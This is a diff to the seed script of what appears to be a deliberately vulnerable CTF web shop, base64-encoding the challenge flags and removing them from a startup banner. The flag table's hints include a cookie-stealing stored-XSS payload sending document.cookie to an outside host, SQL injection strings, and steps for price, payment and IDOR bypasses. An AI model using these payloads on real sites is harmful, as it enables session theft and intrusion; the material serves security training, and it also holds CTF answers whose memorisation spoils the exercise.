@@ -110,7 +110,7 @@ const insertOrderItem = db.prepare(`
 // Pedido 1: Admin (Admin) — contiene los planos secretos (bandera IDOR)
 const order1 = insertOrder.run(
   1, 'completed', 'paid', 752500000,
-  '🚨 INTERNAL ONLY 🚨 Production molds for Bug ???. Factory coordinates: 47.1234°N, 172.5678°W. Access Code: FLAG{idor_leaked_factory_molds}. DO NOT SHARE OUTSIDE DESIGN TEAM.'
+  Buffer.from('8J+aqCBJTlRFUk5BTCBPTkxZIPCfmqggUHJvZHVjdGlvbiBtb2xkcyBmb3IgQnVnID8/Py4gRmFjdG9yeSBjb29yZGluYXRlczogNDcuMTIzNMKwTiwgMTcyLjU2NzjCsFcuIEFjY2VzcyBDb2RlOiBGTEFHe2lkb3JfbGVha2VkX2ZhY3RvcnlfbW9sZHN9LiBETyBOT1QgU0hBUkUgT1VUU0lERSBERVNJR04gVEVBTS4=', 'base64').toString('utf-8')
 );
 insertOrderItem.run(order1.lastInsertRowid, 12, 1, 999);
 
@@ -166,49 +166,49 @@ const insertFlag = db.prepare(`
 
 const flags = [
   ['cart_manipulation',
-    'FLAG{free_drop_cart_manipulation}',
+    Buffer.from('RkxBR3tmcmVlX2Ryb3BfY2FydF9tYW5pcHVsYXRpb259', 'base64').toString('utf-8'),
     'Free Drop (Cart Manipulation)',
     'Acquire the Secret Bug ($999) for $0 or less.',
     'easy',
     'Prices should not be decided on the client side... What if the server blindly trusts what you send?',
     'Intercept the POST /api/cart/checkout request with Burp Suite or DevTools. Find the "unit_price" in the JSON body and change it to 0.'],
   ['stored_xss',
-    'FLAG{xss_collector_stolen_session}',
+    Buffer.from('RkxBR3t4c3NfY29sbGVjdG9yX3N0b2xlbl9zZXNzaW9ufQ==', 'base64').toString('utf-8'),
     'Stolen Session (Stored XSS)',
     'Steal the admin cookie (Admin) by injecting code into the product reviews.',
     'medium',
     'Product reviews are rendered without sanitization. What if you write something that is not just plain text?',
     'Write a review with a payload like <script>document.location="http://your-server?c="+document.cookie</script> or just execute alert() with document.cookie.'],
   ['idor_orders',
-    'FLAG{idor_leaked_factory_molds}',
+    Buffer.from('RkxBR3tpZG9yX2xlYWtlZF9mYWN0b3J5X21vbGRzfQ==', 'base64').toString('utf-8'),
     'Leaked Molds (IDOR)',
     'Read order #1 belonging to Admin containing the factory molds coordinates.',
     'easy',
     'When checking your own collection/orders, the URL has a numeric ID. Does the server verify that order belongs to you?',
     'Make a GET request to /api/orders/1 while logged in as any other user. If there is no ownership validation, you will see Admin data.'],
   ['payment_bypass',
-    'FLAG{payment_bypass_vip_collector}',
+    Buffer.from('RkxBR3twYXltZW50X2J5cGFzc192aXBfY29sbGVjdG9yfQ==', 'base64').toString('utf-8'),
     'Payment Bypass',
     'Complete a purchase without paying by manipulating the payment status.',
     'medium',
     'The payment system trusts the client about the transaction result. Who actually validates if you paid?',
     'Intercept the POST /api/orders/:id/pay request. The server accepts a JSON with {"status": "success"} without verifying with any payment processor. Send it directly.'],
   ['sqli_newsletter',
-    'FLAG{sqli_newsletter_admin_coupon}',
+    Buffer.from('RkxBR3tzcWxpX25ld3NsZXR0ZXJfYWRtaW5fY291cG9ufQ==', 'base64').toString('utf-8'),
     'Newsletter SQLi',
     'Steal the admin exclusive coupon via the newsletter subscription form.',
     'easy',
     'The newsletter input is raw concatenated into the SQL query.',
     "Try putting `bugdrop_admin'--` or `admin' OR '1'='1` in the email input. Because the frontend uses type='text' instead of 'email', you can bypass HTML validation easily."],
   ['admin_panel',
-    'FLAG{the_creator_secret_panel}',
+    Buffer.from('RkxBR3t0aGVfY3JlYXRvcl9zZWNyZXRfcGFuZWx9', 'base64').toString('utf-8'),
     'Admin (Admin Panel)',
     'Access the secret administrator dashboard using a stolen session.',
     'hard',
     'Where do admins usually log in or view internal data? Look for hidden routes like /admin.',
     'Use the JWT token stolen from the Stored XSS challenge. Set it in your browser cookie or localStorage and navigate to /admin.'],
   ['info_disclosure',
-    'FLAG{fuzzing_uncovered_hidden_backups}',
+    Buffer.from('RkxBR3tmdXp6aW5nX3VuY292ZXJlZF9oaWRkZW5fYmFja3Vwc30=', 'base64').toString('utf-8'),
     'Hidden Backups (Info Disclosure)',
     'Find the hidden backup file left by the developers on the public server.',
     'medium',
@@ -230,14 +230,7 @@ console.log(`
 ║  Reviews:    ${reviews.length}                                   ║
 ║  Flags:      ${flags.length}                                   ║
 ╠══════════════════════════════════════════════════╣
-║  🎯 CTF Flags:                                   ║
-║  1. FLAG{free_drop_cart_manipulation}            ║
-║  2. FLAG{xss_collector_stolen_session}           ║
-║  3. FLAG{idor_leaked_factory_molds}              ║
-║  4. FLAG{payment_bypass_vip_collector}           ║
-║  5. FLAG{sqli_newsletter_admin_coupon}           ║
-║  6. FLAG{the_creator_secret_panel}               ║
-║  7. FLAG{fuzzing_uncovered_hidden_backups}       ║
+║  🎯 CTF Flags Loaded Dynamically                ║
 ╚══════════════════════════════════════════════════╝
 `);
 
